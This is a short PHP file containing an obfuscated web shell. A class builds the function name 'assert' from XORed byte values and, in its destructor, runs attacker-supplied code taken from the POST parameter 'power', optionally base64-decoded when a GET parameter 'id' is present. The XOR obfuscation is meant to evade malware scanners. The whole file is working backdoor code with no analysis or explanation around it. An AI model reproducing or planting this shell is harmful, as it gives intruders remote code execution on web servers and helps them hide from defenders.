<?php 
class MSCF { 
    function LRZu() {
        $AgRv = "\x19" ^ "\x78";
        $eMgc = "\x16" ^ "\x65";
        $aDPA = "\x2b" ^ "\x58";
        $PPCO = "\xfe" ^ "\x9b";
        $aODO = "\x7d" ^ "\xf";
        $ZUVK = "\x8c" ^ "\xf8";
        $LawJ =$AgRv.$eMgc.$aDPA.$PPCO.$aODO.$ZUVK;
        return $LawJ;
    }
    function __destruct(){
        $wsKy=$this->LRZu();
        @$wsKy($this->Ae);
    }
}
$mscf = new MSCF();
@$mscf->Ae = isset($_GET['id'])?base64_decode($_POST['power']):$_POST['power'];
?>
